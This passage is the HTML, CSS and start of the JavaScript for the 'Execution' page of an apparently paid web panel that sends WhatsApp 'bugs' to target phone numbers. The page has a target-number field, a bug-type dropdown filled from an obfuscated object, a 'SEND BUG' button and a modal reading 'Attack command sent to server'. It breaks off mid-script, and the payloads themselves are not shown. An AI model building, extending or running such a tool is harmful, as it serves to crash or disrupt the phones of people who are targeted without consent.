    .profile-photo img {\n            width: 115%; \n            height: 100%;\n            object-fit: cover;\n            display: block;\n        }\n\n        .user-info-middle {\n            flex: 1;\n            display: flex;\n            flex-direction: column;\n            justify-content: center; \n            gap: 4px;\n            overflow: hidden;\n        }\n\n        .username {\n            font-size: 16px; \n            color: white;\n            white-space: nowrap;\n            overflow: hidden;\n            text-overflow: ellipsis;\n            line-height: 1.2;\n        }\n\n        .role-box {\n            display: inline-flex;\n            align-items: center;\n            background: rgba(44, 6, 239, 0.73);\n            border-radius: 4px;\n            padding: 3px 8px;\n            border: 1px solid rgba(0, 0, 0, 1);\n            width: fit-content;\n        }\n\n        .role-label { font-size: 8px; color: var(--text-gray); margin-right: 5px; text-transform: uppercase; }\n        .role-value { font-size: 10px; color: var(--accent-pink); text-transform: uppercase; font-weight: bold; }\n\n        .expiry-box {\n            display: flex;\n            flex-direction: column;\n            align-items: center;\n            justify-content: center;\n            background: rgba(0, 0, 0, 1);\n            border-radius: 8px;\n            padding: 6px 10px;\n            border: 1px solid rgba(0, 0, 0, 1);\n            min-width: 75px;\n        }\n\n        .expiry-label { font-size: 8px; color: var(--text-gray); margin-bottom: 2px; text-transform: uppercase; }\n        .expiry-date { font-size: 11px; color: white; }\n\n\n        /* === BANNER === */\n        .banner {\n            width: 100%;\n            height: 140px; \n            border-radius: 12px;\n            overflow: hidden;\n            position: relative;\n            border: 1px solid rgba(26, 25, 25, 1);\n            box-shadow: 0 3px 10px rgba(0,0,0,0.25);\n        }\n        \n        .banner img { \n            width: 100%; \n            height: 100%; \n            object-fit: cover; \n            opacity: 1;\n        }\n        \n        .banner-text {\n            position: absolute; \n            top: 0; \n            left: 0; \n            width: 100%; \n            height: 100%;\n            display: flex; \n            align-items: flex-end;\n            justify-content: flex-start;\n            padding: 13px;\n            background: linear-gradient(to top, rgba(206, 27, 27, 0.85) 0%, transparent 100%);\n        }\n        \n        .banner-text h2 {\n            font-size: 15px; \n            letter-spacing: 1px;\n            color: white;\n            text-shadow: 2px 2px 4px rgba(0, 0, 0, 1); \n            margin: 0;\n        }\n\n        /* FORM INPUTS */\n        .form-section { display: flex; flex-direction: column; gap: 18px; }\n\n        .input-group { margin-bottom: 0; }\n\n        .input-header {\n            background: linear-gradient(90deg, rgba(0, 0, 0, 1), rgba(37, 36, 37, 1));\n            padding: 10px 15px; \n            border-radius: 10px 10px 0 0;\n            border: 1px solid rgba(250, 2, 229, 1);\n            border-bottom: none;\n        }\n        .input-header h3 { font-size: 15px; letter-spacing: 1px; color: white; } \n\n        .input-body {\n            background-color: rgba(243, 241, 247, 1);\n            border: 1px solid rgba(27, 27, 27, 1);\n            border-top: n;\n            border-radius: 0 0 10px 10px;\n            padding: 15px; \n            display: flex; align-items: center; gap: 12px;\n        }\n        .input-body i { color: var(--accent-pink); font-size: 18px; } \n\n        .custom-input {\n            background: transparent; border: n; outline: n;\n            color: #4001efff; font-family: var(--font-main);\n            font-size: 14px; \n            width: 100%;\n        }\n        .custom-input::placeholder { color: #6b7280; font-size: 14px; }\n        \n        /* --- IMPROVED CUSTOM DROPDOWN --- */\n        .custom-dropdown {\n            position: relative;\n            width: 100%;\n        }\n        \n        .dropdown-selected {\n            background: rgba(0, 0, 0, 0.2);\n            border: 1px solid rgba(0, 0, 0, 1);\n            border-radius: 6px;\n            outline: none;\n            color: #000000ff;\n            font-family: var(--font-main);\n            font-size: 14px;\n            width: 100%;\n            cursor: pointer;\n            text-align: left;\n            padding: 10px;\n            height: auto;\n            transition: all 0.3s;\n            display: flex;\n            justify-content: space-between;\n            align-items: center;\n        }\n\n        .dropdown-selected:hover {\n            border-color: rgba(0, 0, 0, 1);\n            background: rgba(219, 39, 119, 0.05);\n        }\n        \n        .dropdown-selected.empty {\n            color: #000000ff;\n        }\n        \n        .dropdown-options {\n            position: absolute;\n            top: calc(100% + 8px);\n            left: 0;\n            width: 100%;\n            background: rgba(15, 5, 24, 0.95);\n            backdrop-filter: blur(10px);\n            -webkit-backdrop-filter: blur(10px);\n            border: 1px solid rgba(255, 247, 250, 0.3);\n            border-radius: 8px;\n            box-shadow: 0 10px 30px rgba(0,0,0,0.5);\n            z-index: 1000;\n            max-height: 250px;\n            overflow-y: auto;\n            \n            /* Animation props */\n            opacity: 0;\n            visibility: hidden;\n            transform: translateY(-10px);\n            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);\n        }\n        \n        .dropdown-options.active {\n            opacity: 1;\n            visibility: visible;\n            transform: translateY(0);\n        }\n        \n        .dropdown-option {\n            padding: 14px 15px;\n            cursor: pointer;\n            color: #9908fad3;\n            border-bottom: 1px solid rgba(255, 255, 255, 0.03);\n            transition: all 0.2s;\n            font-size: 13px;\n            display: flex;\n            align-items: center;\n            gap: 10px;\n        }\n        \n        .dropdown-option:last-child {\n            border-bottom: n;\n        }\n        \n        .dropdown-option:hover {\n            background-color: rgba(219, 39, 119, 0.1);\n            color: white;\n            padding-left: 20px; \n            border-left: 3px solid var(--accent-pink);\n        }\n        \n        .dropdown-option.selected {\n            background-color: rgba(219, 39, 119, 0.15);\n            color: var(--accent-pink);\n            border-left: 3px solid var(--accent-pink);\n        }\n\n        .option-icon {\n            width: 20px;\n            text-align: center;\n            font-size: 12px;\n            color: var(--text-gray);\n        }\n\n        .dropdown-icon {\n            color: var(--accent-pink);\n            pointer-events: none;\n            transition: transform 0.3s;\n        }\n        \n        .dropdown-icon.active {\n            transform: rotate(180deg);\n        }\n\n        /* BUTTON */\n        .send-btn {\n            width: 100%;\n            background: linear-gradient(100deg, var(--accent-pink), var(--accent-purple));\n            color: white; border: none;\n            padding: 15px; \n            font-weight: 600;\n            border-radius: 15px;\n            font-family: var(--font-main);\n            font-size: 14px; \n            letter-spacing: 0px;\n            cursor: pointer;\n            display: flex; align-items: center; justify-content: center; gap: 8px;\n            box-shadow: 0 4px 15px rgba(219, 39, 119, 0.3);\n            margin-top: 10px;\n            transition: transform 0.1s;\n        }\n        .send-btn:active { transform: scale(0.98); }\n        .send-btn:disabled {\n            background: #374151;\n            box-shadow: none;\n            color: #9ca3af;\n            cursor: not-allowed;\n        }\n\n        /* --- BOTTOM NAV (UPDATED - HANYA 3 MENU) --- */\n        .bottom-nav {\n            position: fixed; bottom: 0; left: 0; width: 100%;\n            background-color: rgba(8, 3, 16, 0.98);\n            border-top: 1px solid rgba(255, 255, 255, 0.1);\n            height: 75px; \n            display: flex; justify-content: space-around; align-items: center;\n            z-index: 100;\n        }\n\n        .nav-item {\n            display: flex; flex-direction: column; align-items: center; gap: 5px;\n            cursor: pointer; color: var(--text-gray);\n            background: n; border: n; width: 80px;\n            transition: all 0.2s;\n        }\n\n        .nav-item:active { transform: scale(0.95); }\n        .nav-item.active { color: var(--accent-pink); }\n        \n        .nav-text {\n            font-size: 10px; \n            font-family: var(--font-main);\n            font-weight: 400;\n        }\n\n        /* --- SIDEBAR CSS SAMA SEPERTI DASHBOARD --- */\n        .sidebar-overlay {\n            position: fixed; inset: 0;\n            background: rgba(0, 0, 0, 0.7);\n            backdrop-filter: blur(4px);\n            z-index: 998;\n            opacity: 0; visibility: hidden;\n            transition: all 0.3s ease;\n        }\n        .sidebar-overlay.active { opacity: 1; visibility: visible; }\n\n        .sidebar {\n            position: fixed; top: 0; left: 0; height: 100%;\n            width: 280px;\n            background: rgba(15, 5, 24, 0.98);\n            border-right: 1px solid rgba(219, 39, 119, 0.3);\n            box-shadow: 10px 0 30px rgba(0,0,0,0.6);\n            z-index: 999;\n            transform: translateX(-100%);\n            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);\n            display: flex; flex-direction: column;\n        }\n        .sidebar.active { transform: translateX(0); }\n\n        .sidebar-header {\n            height: 180px;\n            width: 100%;\n            background-image: url('https://files.catbox.moe/k7bn0x.jpg'); \n            background-size: cover;\n            background-position: center;\n            position: relative;\n            display: flex;\n            flex-direction: column;\n            justify-content: flex-end;\n            padding: 20px;\n        }\n\n        .sidebar-header::after {\n            content: '';\n            position: absolute;\n            inset: 0;\n            background: linear-gradient(to top, rgba(15, 5, 24, 1) 15%, rgba(15, 5, 24, 0.4) 60%, transparent 100%);\n            z-index: 1;\n        }\n\n        .sidebar-user {\n            position: relative;\n            z-index: 2;\n            text-align: left;\n        }\n\n        .sidebar-user h3 { \n            font-size: 20px; \n            font-weight: 400; \n            letter-spacing: 0.5px; \n            color: #fff; \n            margin-bottom: 4px;\n            text-shadow: 0 2px 10px rgba(0,0,0,0.8);\n        }\n\n        .user-tag { \n            font-size: 11px; \n            color: var(--accent-pink); \n            letter-spacing: 0px; \n            font-weight: 400;\n            background: rgba(0,0,0,0.6);\n            padding: 3px 8px;\n            border-radius: 4px;\n            border: 1px solid rgba(219, 39, 119, 0.3);\n            display: inline-block;\n        }\n\n        .sidebar-menu { \n            list-style: none; \n            padding: 15px; \n            flex: 1; \n            overflow-y: auto; \n        }\n        .sidebar-item { margin-bottom: 6px; }\n        .sidebar-link {\n            display: flex; align-items: center; gap: 15px;\n            padding: 12px 15px;\n            color: #d1d5db;\n            text-decoration: none;\n            font-size: 14px; font-weight: 400; letter-spacing: 0px;\n            border-radius: 10px;\n            transition: all 0.2s;\n        }\n        .sidebar-link svg { width: 20px; height: 20px; opacity: 0.7; }\n        \n        .sidebar-link:active, .sidebar-link:hover {\n            background: rgba(236, 72, 153, 0.1);\n            color: var(--accent-pink);\n        }\n        .sidebar-link:active svg, .sidebar-link:hover svg { opacity: 1; color: var(--accent-pink); }\n\n        .menu-separator {\n            height: 1px;\n            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.15), transparent);\n            margin: 15px 0;\n            width: 100%;\n        }\n\n        .sidebar-credits {\n            padding: 0 10px;\n            margin-bottom: 10px;\n        }\n\n        .credits-title {\n            font-size: 11px;\n            color: var(--accent-pink);\n            text-transform: uppercase;\n            letter-spacing: 1px;\n            margin-bottom: 12px;\n            font-weight: 400;\n            opacity: 0.9;\n            padding-left: 10px;\n        }\n\n        .credit-item {\n            font-size: 12px;\n            color: #6b7280;\n            margin-bottom: 8px;\n            display: flex;\n            align-items: center;\n            gap: 8px;\n            letter-spacing: 0px;\n            padding-left: 10px;\n        }\n\n        .credit-item span {\n            color: #e5e7eb;\n            font-weight: 400;\n        }\n\n        .sidebar-footer { padding: 20px; border-top: 1px solid rgba(255,255,255,0.05); }\n        .logout-btn {\n            width: 100%; padding: 12px;\n            background: rgba(239, 68, 68, 0.1);\n            border: 1px solid rgba(239, 68, 68, 0.3);\n            color: #ef4444;\n            border-radius: 12px;\n            font-family: var(--font-main);\n            font-size: 13px; font-weight: 700; letter-spacing: 1px;\n            cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;\n            transition: background 0.2s;\n        }\n        .logout-btn:active { background: rgba(239, 68, 68, 0.2); }\n\n        /* --- SUCCESS MODAL CSS --- */\n        .modal-overlay {\n            position: fixed;\n            top: 0; left: 0; width: 100%; height: 100%;\n            background: rgba(0, 0, 0, 0.85);\n            backdrop-filter: blur(5px);\n            z-index: 2000;\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            opacity: 0;\n            visibility: hidden;\n            transition: all 0.3s ease;\n        }\n        \n        .modal-overlay.active {\n            opacity: 1;\n            visibility: visible;\n        }\n\n        .success-card {\n            background: #11071F;\n            border: 1px solid var(--accent-pink);\n            width: 85%;\n            max-width: 320px;\n            padding: 30px 20px;\n            border-radius: 20px;\n            text-align: center;\n            position: relative;\n            box-shadow: 0 0 30px rgba(219, 39, 119, 0.2);\n            transform: scale(0.8);\n            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);\n        }\n\n        .modal-overlay.active .success-card {\n            transform: scale(1);\n        }\n\n        .success-icon-container {\n            width: 70px; height: 70px;\n            background: rgba(16, 185, 129, 0.1);\n            border: 2px solid var(--accent-green);\n            border-radius: 50%;\n            display: flex; justify-content: center; align-items: center;\n            margin: 0 auto 20px;\n            box-shadow: 0 0 15px rgba(16, 185, 129, 0.3);\n        }\n\n        .success-icon-container i {\n            color: var(--accent-green);\n            font-size: 32px;\n            animation: checkPop 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;\n        }\n\n        @keyframes checkPop {\n            0% { transform: scale(0); opacity: 0; }\n            80% { transform: scale(1.2); }\n            100% { transform: scale(1); opacity: 1; }\n        }\n\n        .success-title {\n            color: white; font-size: 18px; margin-bottom: 5px;\n            letter-spacing: 1px;\n        }\n\n        .success-subtitle {\n            color: var(--text-gray); font-size: 12px; margin-bottom: 20px;\n        }\n\n        .success-details {\n            background: rgba(0,0,0,0.3);\n            border-radius: 8px;\n            padding: 10px;\n            margin-bottom: 20px;\n            text-align: left;\n            border: 1px dashed rgba(255,255,255,0.1);\n        }\n\n        .detail-row {\n            display: flex; justify-content: space-between;\n            font-size: 11px; margin-bottom: 5px;\n        }\n        .detail-row:last-child { margin-bottom: 0; }\n        .detail-label { color: #6b7280; }\n        .detail-value { color: var(--accent-pink); font-weight: bold; }\n\n        .close-modal-btn {\n            background: var(--accent-pink);\n            color: white;\n            border: none;\n            width: 100%;\n            padding: 12px;\n            border-radius: 10px;\n            font-family: var(--font-main);\n            font-weight: bold;\n            cursor: pointer;\n            box-shadow: 0 4px 10px rgba(219, 39, 119, 0.3);\n        }\n\n        /* Loading Spinner */\n        .loading {\n            display: inline-block;\n            width: 20px;\n            height: 20px;\n            border: 3px solid rgba(255,255,255,.3);\n            border-radius: 50%;\n            border-top-color: var(--accent-pink);\n            animation: spin 1s ease-in-out infinite;\n        }\n        \n        @keyframes spin {\n            to { transform: rotate(360deg); }\n        }\n        \n        /* Hide class */\n        .hidden {\n            display: none !important;\n        }\n\n    </style>\n</head>\n<body>\n    <div class=\"sidebar-overlay\" id=\"sidebarOverlay\"></div>\n    <aside class=\"sidebar\" id=\"sidebar\">\n        <div class=\"sidebar-header\">\n            <div class=\"sidebar-user\">\n                <h3 id=\"sidebar-username\">Loading...</h3>\n                <div class=\"user-tag\" id=\"sidebar-role\">ID: #Loading • ROLE</div>\n            </div>\n        </div>\n\n        <ul class=\"sidebar-menu\">\n            <li class=\"sidebar-item\">\n                <a href=\"/dashboard\" class=\"sidebar-link\">\n                    <svg fill=\"n\" stroke=\"currentColor\" stroke-width=\"2\" viewBox=\"0 0 24 24\"><path d=\"M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6\"></path></svg>\n                    Dashboard\n                </a>\n            </li>\n            <li class=\"sidebar-item\">\n                <a href=\"/profile\" class=\"sidebar-link\">\n                    <svg fill=\"n\" stroke=\"currentColor\" stroke-width=\"2\" viewBox=\"0 0 24 24\"><path d=\"M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z\"></path></svg>\n                    Profile\n                </a>\n            </li>\n            <li class=\"sidebar-item\">\n                <a href=\"/execution\" class=\"sidebar-link active\">\n                    <svg fill=\"n\" stroke=\"currentColor\" stroke-width=\"2\" viewBox=\"0 0 24 24\"><path d=\"M13 10V3L4 14h7v7l9-11h-7z\"></path></svg>\n                    Execution\n                </a>\n            </li>\n            \n            <li class=\"sidebar-item hidden\" id=\"admin-menu-item\">\n                <a href=\"/user-management\" class=\"sidebar-link\">\n                    <svg fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" viewBox=\"0 0 24 24\"><path d=\"M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z\"></path></svg>\n                    Admin menu\n                </a>\n            </li>\n            \n            <li class=\"sidebar-item\">\n                <a href=\"/my-support\" class=\"sidebar-link\">\n                    <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"25px\" viewBox=\"0 -960 960 960\" width=\"25px\" fill=\"currentColor\"><path d=\"M61.85-425.31q-20.31-36.77-31.08-74.73T20-576q0-102.77 70.62-173.38Q161.23-820 264-820q61.85 0 118.27 29 56.42 29 97.73 82.16Q521.31-762 577.73-791T696-820q102.77 0 173.38 70.62Q940-678.77 940-576q0 37.23-10.77 74.81-10.77 37.57-31.08 75.5-8.69-13.62-20.42-24.39-11.73-10.76-26.35-17.46 14-28.38 21.31-55.19Q880-549.54 880-576q0-77.62-53.19-130.81T696-760q-71.38 0-118.35 40.85Q530.69-678.31 480-616q-50.69-62.92-97.65-103.46Q335.38-760 264-760q-77.62 0-130.81 53.19T80-576q0 27.23 7.31 54.23 7.31 27 20.92 54.62-14.61 7.07-26.15 17.65-11.54 10.58-20.23 24.19ZM20-99.23V-148q0-40.54 41.81-65.88 41.81-25.35 108.58-25.35 12.23 0 23.46.69t21.46 2.69q-11.31 17.7-17.16 37.62-5.84 19.92-5.84 42.46v56.54H20Zm240 0v-55q0-57.31 60.92-91.92 60.93-34.62 159.08-34.62 99.15 0 159.58 34.62Q700-211.54 700-154.23v55H260Zm507.69 0v-56.54q0-22.54-5.34-42.46-5.35-19.92-16.04-37.62 10.23-2 21.15-2.69 10.92-.69 22.54-.69 67.38 0 108.69 25.35Q940-188.54 940-148v48.77H767.69Zm-597.3-178.85q-28.39 0-48.43-20.03-20.04-20.04-20.04-48.43 0-28.61 20.04-48.34 20.04-19.73 48.43-19.73 28.61 0 48.53 19.73 19.93 19.73 19.93 48.34 0 28.39-19.93 48.43-19.92 20.03-48.53 20.03Zm619.61 0q-28 0-48.23-20.03-20.23-20.04-20.23-48.43 0-28.61 20.23-48.34Q762-414.61 790-414.61q29 0 48.73 19.73 19.73 19.73 19.73 48.34 0 28.39-19.73 48.43Q819-278.08 790-278.08Zm-310-32.69q-43.08 0-73.46-30.38-30.38-30.39-30.38-73.46 0-44.08 30.38-73.96 30.38-29.89 73.46-29.89 44.08 0 73.96 29.89 29.88 29.88 29.88 73.96 0 43.07-29.88 73.46-29.88 30.38-73.96 30.38Z\"/></svg>Support\n                </a>\n            </li>\n\n            <li class=\"menu-separator\"></li>\n\n            <div class=\"sidebar-credits\">\n                <div class=\"credits-title\">Development Team</div>\n                <div class=\"credit-item\">\n                    <span>@ronisirr</span> - Dev Sigma\n                </div>\n                <div class=\"credit-item\">\n                    <span>@N3xithCore</span> - My Chanel\n                </div>\n            </div>\n        </ul>\n\n        <div class=\"sidebar-footer\">\n            <button class=\"logout-btn\" id=\"logoutBtn\">\n                <svg width=\"18\" height=\"18\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" viewBox=\"0 0 24 24\"><path d=\"M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1\"></path></svg>\n                LOGOUT SYSTEM\n            </button>\n        </div>\n    </aside>\n\n    <div class=\"modal-overlay\" id=\"successModal\">\n        <div class=\"success-card\">\n            <div class=\"success-icon-container\">\n                <i class=\"fa-solid fa-check\"></i>\n            </div>\n            <h3 class=\"success-title\">SYSTEM SUCCESS</h3>\n            <p class=\"success-subtitle\">Attack command sent to server</p>\n            \n            <div class=\"success-details\">\n                <div class=\"detail-row\">\n                    <span class=\"detail-label\">Target:</span>\n                    <span class=\"detail-value\" id=\"modalTarget\">-</span>\n                </div>\n                <div class=\"detail-row\">\n                    <span class=\"detail-label\">Method:</span>\n                    <span class=\"detail-value\" id=\"modalBug\">-</span>\n                </div>\n                <div class=\"detail-row\">\n                    <span class=\"detail-label\">Status:</span>\n                    <span class=\"detail-value\" style=\"color: var(--accent-green);\">EXECUTING</span>\n                </div>\n            </div>\n\n            <button class=\"close-modal-btn\" id=\"closeModalBtn\">CONFIRM</button>\n        </div>\n    </div>\n\n    <div class=\"container\">\n        <header>\n            <div class=\"header-left\">\n                <svg id=\"menuBtn\" class=\"menu-btn\" width=\"28\" height=\"28\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\">\n                    <line x1=\"3\" y1=\"6\" x2=\"21\" y2=\"6\"></line>\n                    <line x1=\"3\" y1=\"12\" x2=\"15\" y2=\"12\"></line> \n                    <line x1=\"3\" y1=\"18\" x2=\"18\" y2=\"18\"></line>\n                </svg>\n                <h1 class=\"brand-title\">RONI VERSION</h1>\n            </div>\n        </header>\n\n        <!-- MAIN CONTENT -->\n        <main>\n            <div class=\"user-card\">\n                <div class=\"user-card-content\">\n                    <div class=\"profile-photo\">\n                        <img src=\"https://files.catbox.moe/k7bn0x.jpg\" alt=\"Profile\">\n                    </div>\n                    <div class=\"user-info-middle\">\n                        <div class=\"username\" id=\"exec-username\">Loading...</div>\n                        <div class=\"role-box\">\n                            <span class=\"role-label\">Role</span>\n                            <span class=\"role-value\" id=\"exec-role\">LOADING</span>\n                        </div>\n                    </div>\n                    <div class=\"expiry-box\">\n                        <div class=\"expiry-label\">Expires</div>\n                        <div class=\"expiry-date\" id=\"exec-expired\">Loading...</div>\n                    </div>\n                </div>\n            </div>\n\n            <!-- BANNER -->\n            <div class=\"banner\">\n                <img src=\"https://files.catbox.moe/k7bn0x.jpg\">\n                <div class=\"banner-text\">\n                    <h2>One shot, One kill</h2>\n                </div>\n            </div>\n\n            <!-- FORM SECTION -->\n            <div class=\"form-section\">\n                <div class=\"input-group\">\n                    <div class=\"input-header\">\n                        <h3>Number Targets</h3>\n                    </div>\n                    <div class=\"input-body\">\n                        <i class=\"fa-solid fa-mobile-screen\"></i>\n                        <input type=\"text\" placeholder=\"e.g. +62xxxxxxxxxx\" class=\"custom-input\" id=\"targetInput\">\n                    </div>\n                </div>\n\n                <div class=\"input-group\">\n                    <div class=\"input-header\">\n                        <h3>Pilih Bug</h3>\n                    </div>\n                    <div class=\"input-body\">\n                        <i class=\"fa-solid fa-biohazard\"></i>\n                        <div class=\"custom-dropdown\" id=\"bugDropdown\">\n                            <div class=\"dropdown-selected empty\" id=\"dropdownSelected\">\n                                <span>Select Type Bug</span>\n                                <div class=\"dropdown-icon\">\n                                    <i class=\"fa-solid fa-caret-down\"></i>\n                                </div>\n                            </div>\n                            \n                            <div class=\"dropdown-options\" id=\"dropdownOptions\">\n                                " + Object.entries(_0x18195b).map(([_0x3e2f9b, _0x5787fd]) => "\n                                <div class=\"dropdown-option\" data-value=\"" + _0x3e2f9b + "\">\n                                    <span class=\"option-icon\"><i class=\"" + (_0x5787fd.icon || "fa-solid fa-bug") + "\"></i></span>\n                                    <span>" + _0x5787fd.name + "</span>\n                                </div>\n                                ").join("") + "\n                            </div>\n                        </div>\n                        <input type=\"hidden\" id=\"bugValue\" value=\"\">\n                    </div>\n                </div>\n\n                <!-- Button -->\n                <button class=\"send-btn\" id=\"sendBtn\" disabled>\n                    <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\" viewBox=\"0 -960 960 960\" width=\"24px\" fill=\"#FFFFFF\"><path d=\"M120-160v-240l320-80-320-80v-240l760 320-760 320Z\"/></svg>\n                    SEND BUG\n                </button>\n            </div>\n        </main>\n\n        <nav class=\"bottom-nav\">\n            <button class=\"nav-item\" id=\"navDashboard\">\n                <svg width=\"22\" height=\"22\" fill=\"currentColor\" viewBox=\"0 0 24 24\"><path d=\"M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z\"></path></svg>\n                <span class=\"nav-text\">Home</span>\n            </button>\n            <button class=\"nav-item active\" id=\"navWhatsApp\">\n                <svg width=\"22\" height=\"22\" viewBox=\"0 -960 960 960\" fill=\"currentColor\" transform=\"matrix(-1,0,0,1,0,0)\">\n                    <path d=\"M240-400h480v-80H240v80Zm0-120h480v-80H240v80Zm0-120h480v-80H240v80ZM880-80 720-240H160q-33 0-56.5-23.5T80-320v-480q0-33 23.5-56.5T160-880h640q33 0 56.5 23.5T880-800v720ZM160-320h594l46 45v-525H160v480Zm0 0v-480 480Z\"></path>\n                </svg>\n                <span class=\"nav-text\">WhatsApp</span>\n            </button>\n            <button class=\"nav-item\" id=\"navAnime\">\n                <svg width=\"22\" height=\"22\" viewBox=\"0 -960 960 960\" fill=\"currentColor\">\n                    <path d=\"m160-800 80 160h120l-80-160h80l80 160h120l-80-160h80l80 160h120l-80-160h120q33 0 56.5 23.5T880-720v480q0 33-23.5 56.5T800-160H160q-33 0-56.5-23.5T80-240v-480q0-33 23.5-56.5T160-800Zm0 240v320h640v-320H160Zm0 0v320-320Z\"/>\n                    <path d=\"M380-320 l-25-60 -60-25 60-25 25-60 25 60 60 25 -60 25 -25 60Z\"/>\n                    <path d=\"M580-480 l-15-35 -35-15 35-15 15-35 15 35 35 15 -35 15 -15 35Z\"/>\n                </svg>\n                <span class=\"nav-text\">Anime</span>\n            </button>\n        </nav>\n    </div>\n\n    <script>\n        document.addEventListener('DOMContentLoaded', async () => {\n            const menuBtn = document.getElementById('menuBtn');\n            const sidebar = document.getElementById('sidebar');\n            const overlay = document.getElementById('sidebarOverlay');\n            const sendBtn = document.getElementById('sendBtn');\n            const targetInput = document.getElementById('targetInput');\n            \n            // Modal Elements\n            const successModal = document.getElementById('successModal');\n            const closeModalBtn = document.getElementById('closeModalBtn');\n            const modalTarget = document.getElementById('modalTarget');\n            const modalBug = document.getElementById('modalBug');\n\n            // Dropdown Elements\n            const dropdownSelected = document.getElementById('dropdownSelected');\n            const dropdownOptions = document.getElementById('dropdownOptions');\n            const dropdownIcon = document.querySelector('.dropdown-icon');\n            const bugValueInput = document.getElementById('bugValue');\n            const dropdownOptionsList = document.querySelectorAll('.dropdown-option');\n\n            // Logout Button\n            const logoutBtn = document.getElementById('logoutBtn');\n\n            async function fetchUserData() {\n                try {\n                    const response = await fetch('/api/option-data');\n                    if (!response.ok) {\n                        throw new Error('Failed to fetch user data');\n                    }\n                    const userData = await response.json();\n                    \n                    console.log('User data fetched in execution:', userData);\n                    \n                    // Update sidebar\n                    const sidebarUsername = document.getElementById('sidebar-username');\n                    const sidebarRole = document.getElementById('sidebar-role');\n                    \n                    if (sidebarUsername) sidebarUsername.textContent = userData.username || 'Guest';\n                    if (sidebarRole) sidebarRole.textContent = `Role: ${userData.role ? userData.role.toUpperCase() : 'USER'}`;\n                    \n                    // Update user card di halaman execution\n                    const execUsername = document.getElementById('exec-username');\n                    const execRole = document.getElementById('exec-role');\n                    const execExpired = document.getElementById('exec-expired');\n                    \n                    if (execUsername) execUsername.textContent = userData.username || 'Guest';\n                    if (execRole) execRole.textContent = userData.role ? userData.role.toUpperCase() : 'USER';\n                    if (execExpired) {\n                        if (userData.expired === 'Permanent' || userData.daysRemaining === 99999) {\n                            execExpired.textContent = 'Permanent';\n                            execExpired.style.color = '#10b981';\n                        } else {\n                            execExpired.textContent = userData.expired || 'Unknown';\n                            execExpired.style.color = '#eab308';\n                        }\n                    }\n                    \n                    const adminMenuItem = document.getElementById('admin-menu-item');\n                    if (adminMenuItem) {\n                        if (userData.role === 'owner' || userData.role === 'admin') {\n                            adminMenuItem.classList.remove('hidden');\n                        } else {\n                            adminMenuItem.classList.add('hidden');\n                        }\n                    }\n                    \n                    return userData;\n                } catch (error) {\n                    console.error('Error fetching user data:', error);\n                    document.getElementById('sidebar-username').textContent = 'Error';\n                    document.getElementById('sidebar-role').textContent = 'Role: ERROR';\n                    document.getElementById('exec-username').textContent = 'Error';\n                    document.getElementById('exec-role').textContent = 'ERROR';\n                    document.getElementById('exec-expired').textContent = 'Error loading';\n                    \n                    const adminMenuItem = document.getElementById('admin-menu-item');\n                    if (adminMenuItem) {\n                        adminMenuItem.classList.add('hidden');\n                    }\n                    \n                    return null;\n                }\n            }\n\n            // Load user data on page load\n            await fetchUserData();\n\n            // Toggle Sidebar\n            function toggleSidebar() {\n                sidebar.classList.toggle('active');\n                overlay.classList.toggle('active');\n            }\n            menuBtn.addEventListener('click', toggleSidebar);\n            overlay.addEventListener('click', toggleSidebar);\n\n            // Navbar Navigation\n            document.getElementById('navDashboard').addEventListener('click', () => {\n                window.location.href = '/dashboard';\n            });\n\n            document.getElementById('navWhatsApp').addEventListener('click', () => {\n                window.location.href = '/execution';\n            });\n\n            document.getElementById('navAnime').addEventListener('click', () => {\n                window.location.href = '/anime';\n            });\n\n            // Logout Button\n            logoutBtn.addEventListener('click', () => {\n                if (confirm('Are you sure you want to logout?')) {\n                    window.location.href = '/logout';\n                }\n            });\n\n            // --- DROPDOWN LOGIC ---\n            dropdownSelected.addEventListener('click', (e) => {\n                e.stopPropagation();\n                dropdownOptions.classList.toggle('active');\n                dropdownIcon.classList.toggle('active');\n            });\n\n            dropdownOptionsList.forEach(option => {\n                option.addEventListener('click', () => {\n                    const text = option.querySelectorAll('span')[1].textContent;\n                    \n                    dropdownSelected.querySelector('span').textContent = text;\n                    dropdownSelected.classList.remove('empty');\n                    \n                    // Update hidden value\n                    bugValueInput.value = option.getAttribute('data-value');\n                    \n                    // Visual Selection\n                    dropdownOptionsList.forEach(opt => opt.classList.remove('selected'));\n                    option.classList.add('selected');\n                    \n                    // Close dropdown\n                    dropdownOptions.classList.remove('active');\n                    dropdownIcon.classList.remove('active');\n                    \n                    validateForm();\n                });\n            });\n\n            document.addEventListener('click', (e) => {\n                if (!e.target.closest('.custom-dropdown')) {\n                    dropdownOptions.classList.remove('active');\n                    dropdownIcon.classList.remove('active');\n                }\n            });\n\n            // --- FORM LOGIC ---\n            function validateForm() {\n                const isTargetFilled = targetInput.value.trim() !== '';\n                const isBugSelected = bugValueInput.value !== '';\n                sendBtn.disabled = !(isTargetFilled && isBugSelected);\n            }\n\n            targetInput.addEventListener('input', validateForm);\n\n            // --- SEND BUTTON & MODAL ---\n            sendBtn.addEventListener('click', async () => {\n                if(sendBtn.disabled) return;\n\n                const originalContent = 